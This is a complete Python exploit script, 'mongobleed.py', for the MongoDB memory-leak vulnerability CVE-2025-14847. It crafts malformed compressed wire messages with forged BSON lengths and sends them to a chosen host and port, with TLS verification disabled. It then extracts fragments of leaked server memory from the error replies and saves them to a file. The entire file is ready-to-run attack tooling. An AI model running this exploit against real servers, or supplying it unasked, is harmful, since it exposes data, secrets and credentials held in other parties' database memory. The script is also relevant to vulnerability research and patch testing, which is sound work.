#!/usr/bin/env python3
# /// script
# requires-python = ">=3.14"
# dependencies = [
# ]
# ///
"""
mongobleed.py - CVE-2025-14847 MongoDB Memory Leak Exploit

Author: Joe Desimone - x.com/dez_

Exploits zlib decompression bug to leak server memory via BSON field names.
Technique: Craft BSON with inflated doc_len, server reads field names from
leaked memory until null byte.
"""

import argparse
import logging
import re
import socket
import struct
import zlib
import ssl
from functools import partial
from pathlib import Path
from typing import List, Set, Callable

L = logging.getLogger("🩸 mongobleed")


def setup_logger(verbose: bool = True) -> None:
    """Configure root logger with sane defaults.

    Args:
        verbose: Whether to enable debug-level logging.
    """
    logging.basicConfig(
        level=logging.DEBUG if verbose else logging.INFO,
        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
    )


def build_payload(claimed_doc_length: int, declared_uncompressed_size: int) -> bytes:
    """Build a malformed OP_COMPRESSED payload to trigger the bug.

    Args:
        claimed_doc_length: Forged BSON document length to read beyond the buffer.
        declared_uncompressed_size: Inflated uncompressed size placed in the
            OP_COMPRESSED header.

    Returns:
        Bytes representing the crafted wire message.
    """
    # Minimal BSON content - we lie about total length
    content = b"\x10a\x00\x01\x00\x00\x00"  # int32 a=1
    bson = struct.pack("<i", claimed_doc_length) + content

    # Wrap in OP_MSG
    op_msg_body = struct.pack("<I", 0) + b"\x00" + bson
    compressed_body = zlib.compress(op_msg_body)

    # OP_COMPRESSED with inflated buffer size (triggers the bug)
    payload = struct.pack("<I", 2013)  # original opcode
    payload += struct.pack(
        "<i", declared_uncompressed_size
    )  # claimed uncompressed size
    payload += struct.pack("B", 2)  # zlib
    payload += compressed_body

    header = struct.pack("<IIII", 16 + len(payload), 1, 0, 2012)

    return header + payload


def retrieve_chunks(
    conn: socket.socket, claimed_doc_length: int, declared_uncompressed_size: int
) -> bytes:
    """Send the exploit payload and collect a full MongoDB response.

    Args:
        conn: Established TCP socket to the MongoDB server.
        payload: payload to send
        claimed_doc_length: Document length used in the payload.
        declared_uncompressed_size: Claimed uncompressed buffer size for OP_COMPRESSED.

    Returns:
        Raw response bytes (possibly compressed) from the server.
    """
    payload = build_payload(claimed_doc_length, declared_uncompressed_size)
    conn.sendall(payload)
    response = b""
    while len(response) < 4 or len(response) < struct.unpack("<I", response[:4])[0]:
        chunk = conn.recv(4096)
        if not chunk:
            break
        response += chunk
    return response


_FIELD_RE = re.compile(rb"field name '([^']*)'")
_TYPE_RE = re.compile(rb"type (\d+)")
_IGNORED_FIELDS = {b"?", b"a", b"$db", b"ping"}


def extract_leaks(response: bytes) -> List[bytes]:
    """Extract leaked fragments from an error response.

    Args:
        response: Raw wire response bytes returned by the server.

    Returns:
        List of leaked byte fragments (field names and type bytes).
    """
    # Fast length guard
    if len(response) < 25:
        return []

    try:
        # Use memoryview to avoid unnecessary copies
        response_view = memoryview(response)
        message_length = struct.unpack_from("<I", response_view, 0)[0]
        # Sanity check msg_len
        if message_length > len(response_view) or message_length < 16:
            return []
        is_compressed = struct.unpack_from("<I", response_view, 12)[0] == 2012
        uncompressed_section = (
            zlib.decompress(response_view[25:message_length])
            if is_compressed
            else response_view[16:message_length]
        )
    except (struct.error, zlib.error, ValueError):
        return []

    leaked_fragments: List[bytes] = []

    # Extract field names
    fields = _FIELD_RE.finditer(uncompressed_section)
    fields = map(lambda m: m.group(1), fields)
    fields = filter(lambda f: f and f not in _IGNORED_FIELDS, fields)
    leaked_fragments.extend(fields)

    # Extract type bytes
    types = _TYPE_RE.finditer(uncompressed_section)
    types = map(lambda m: m.group(1), types)
    types = map(lambda t: bytes((int(t) & 0xFF,)), types)
    leaked_fragments.extend(types)

    return leaked_fragments


def collect_unique_fragments(
    conn: socket.socket,
    min_document_length: int,
    max_document_length: int,
) -> Set[bytes]:
    """Collect unique leaked fragments across a range of document lengths.

    Args:
        host: Target host.
        port: Target port.
        min_document_length: Starting BSON document length to probe.
        max_document_length: Ending BSON document length (exclusive).
        timeout: Socket timeout in seconds.

    Returns:
        Set of unique leaked fragments observed.
    """
    unique_fragments: Set[bytes] = set()
    try:
        get_chunk: Callable[[int, int], bytes] = partial(retrieve_chunks, conn)
        for claimed_doc_length in range(min_document_length, max_document_length):
            declared_uncompressed_size = claimed_doc_length + 500
            L.debug(f"nb fragments extracted: {len(unique_fragments)}")
            L.debug(f"retrieving {claimed_doc_length}:{declared_uncompressed_size}")
            response = get_chunk(claimed_doc_length, declared_uncompressed_size)
            leaked_fragments = extract_leaks(response)
            unique_fragments = unique_fragments.union(set(leaked_fragments))
    except Exception as e:
        L.error(
            f"Encountered an error while trying to collect unique fragments from conn {e}"
        )
        raise e

    return unique_fragments


def exploit(
    host: str,
    port: int,
    min_document_length: int,
    max_document_length: int,
    out_path: Path,
    tls: bool = True,
) -> None:
    """Run the MongoDB memory leak exploit across a range of offsets.

    Args:
        host: Target host.
        port: Target port.
        min_document_length: Starting BSON document length to probe.
        max_document_length: Ending BSON document length (exclusive).
        out_path: File path where leaked bytes are written.
        tls: Set to True for a TLS socket
    """
    L.info("init CVE-2025-14847 MongoDB Memory Leak script")
    L.info(f"target: {host}:{port}")
    L.info(f"scanning offsets {min_document_length}-{max_document_length}")

    with socket.create_connection((host, port)) as conn:
        if tls:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            with context.wrap_socket(conn) as sconn:
                unique_fragments = collect_unique_fragments(
                    sconn, min_document_length, max_document_length
                )
        else:
            unique_fragments = collect_unique_fragments(
                conn, min_document_length, max_document_length
            )

    leaked_bytes = b"".join(list(unique_fragments))
    # Save results
    with open(out_path, "wb") as outfile:
        outfile.write(leaked_bytes)

    L.info(f"total leaked: {len(leaked_bytes)} bytes")
    L.info(f"unique fragments: {len(unique_fragments)}")
    L.info(f"saved to: {out_path}")


def parse_arguments() -> argparse.Namespace:
    """Parse CLI arguments for the exploit script.

    Returns:
        Parsed argparse namespace.
    """
    parser = argparse.ArgumentParser(description="CVE-2025-14847 MongoDB Memory Leak")
    parser.add_argument("--host", default="localhost", help="Target host")
    parser.add_argument("--port", type=int, default=27017, help="Target port")
    parser.add_argument("--min-offset", type=int, default=20, help="Min doc length")
    parser.add_argument("--max-offset", type=int, default=8192, help="Max doc length")
    parser.add_argument(
        "--output", default=Path("leaked.bin"), help="Output file", type=Path
    )
    parser.add_argument("--verbose", action=argparse.BooleanOptionalAction)
    parser.add_argument("--tls", action=argparse.BooleanOptionalAction)
    return parser.parse_args()


def main() -> None:
    """Entrypoint for CLI execution."""
    args = parse_arguments()
    setup_logger(args.verbose)
    exploit(
        args.host, args.port, args.min_offset, args.max_offset, args.output, args.tls
    )


if __name__ == "__main__":
    main()
